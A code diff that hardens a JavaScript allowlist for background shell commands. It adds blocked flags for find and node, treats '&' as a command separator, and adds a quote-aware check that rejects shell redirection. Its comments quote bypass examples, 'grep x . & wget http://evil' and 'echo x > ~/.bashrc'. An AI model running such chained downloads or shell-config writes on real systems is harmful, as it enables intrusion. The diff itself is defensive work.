@@ -23,8 +23,18 @@ const ALLOWED_COMMANDS = {
       /^find\s+["'][^/][^"']*["']/,
       /^find\s+[^/\s][^\s]*/,
     ],
-    dangerous_flags: ['-delete', '-exec', 'rm'],
-    description: 'Find files (restrict -delete, -exec, rm)',
+    dangerous_flags: [
+      '-delete',
+      '-exec',
+      '-execdir',
+      '-ok',
+      '-okdir',
+      '-fprintf',
+      '-fprint',
+      '-fls',
+      'rm',
+    ],
+    description: 'Find files (restrict -delete, -exec/-execdir, -ok, -f* sinks, rm)',
   },
   grep: {
     allowed: true,
@@ -133,7 +143,14 @@ const ALLOWED_COMMANDS = {
   },
   node: {
     allowed: true,
-    description: 'Node.js runtime',
+    patterns: [
+      /^node\s+(?:--version|-v)(?:\s|$)/,
+      /^node\s+--test(?:\s|$)/,
+      /^node\s+--check\s+(?:"[^"]+\.(?:cjs|mjs|js)"|'[^']+\.(?:cjs|mjs|js)'|[^\s]+\.(?:cjs|mjs|js))(?:\s|$)/,
+      /^node\s+(?:"[^"]+\.(?:cjs|mjs|js)"|'[^']+\.(?:cjs|mjs|js)'|[^\s]+\.(?:cjs|mjs|js))(?:\s|$)/,
+    ],
+    dangerous_flags: ['-e', '--eval', '-p', '--print', '-r', '--require'],
+    description: 'Node.js runtime (file, --test, or --check only; no inline eval/print)',
   },
 
   // Token usage reporting (safe read-only)
@@ -341,7 +358,10 @@ function splitShellCommandSegments(command) {
         continue;
       }
 
-      if (ch === ';' || ch === '|' || ch === '\n') {
+      if (ch === ';' || ch === '|' || ch === '\n' || ch === '&') {
+        // Single `&` (background operator) is a control separator just like
+        // `;` and `|`. Without this, a blocked command chained after `&`
+        // (e.g. `grep x . & wget http://evil`) was never inspected and ran.
         segments.push(buffer);
         buffer = '';
         continue;
@@ -374,6 +394,45 @@ function hasCommandSubstitution(command) {
 }
 
 /**
+ * Detect unquoted shell redirection operators (`>`, `>>`, `<`, `<<`, `2>`, `&>`).
+ * Quote-aware: only flags redirection characters that sit OUTSIDE single/double
+ * quotes (so `grep "a->b" file` is fine, but `echo x > ~/.bashrc` is blocked).
+ * This mirrors bash semantics where an unquoted `>`/`<` is always a redirection.
+ *
+ * @param {string} command
+ * @returns {boolean}
+ */
+function hasShellRedirection(command) {
+  const text = String(command || '');
+  let inSingle = false;
+  let inDouble = false;
+  let escapeNext = false;
+  for (let i = 0; i < text.length; i++) {
+    const ch = text[i];
+    if (escapeNext) {
+      escapeNext = false;
+      continue;
+    }
+    if (ch === '\\') {
+      escapeNext = true;
+      continue;
+    }
+    if (!inDouble && ch === "'") {
+      inSingle = !inSingle;
+      continue;
+    }
+    if (!inSingle && ch === '"') {
+      inDouble = !inDouble;
+      continue;
+    }
+    if (!inSingle && !inDouble && (ch === '>' || ch === '<')) {
+      return true;
+    }
+  }
+  return false;
+}
+
+/**
  * Check if command is allowed
  * @param {string} command - Full shell command
  * @returns {{allowed: boolean, reason?: string, command?: string}}
@@ -383,6 +442,14 @@ function isCommandAllowed(command) {
     return {
       allowed: false,
       reason: 'Command substitution is not allowed in background commands',
+      command: '',
+    };
+  }
+
+  if (hasShellRedirection(command)) {
+    return {
+      allowed: false,
+      reason: 'Shell redirection (>, >>, <) is not allowed in background commands',
       command: '',
     };
   }
@@ -461,5 +528,6 @@ module.exports = {
   BLOCKED_COMMANDS,
   extractPrimaryCommand,
   splitShellCommandSegments,
+  hasShellRedirection,
   isCommandAllowed,
 };
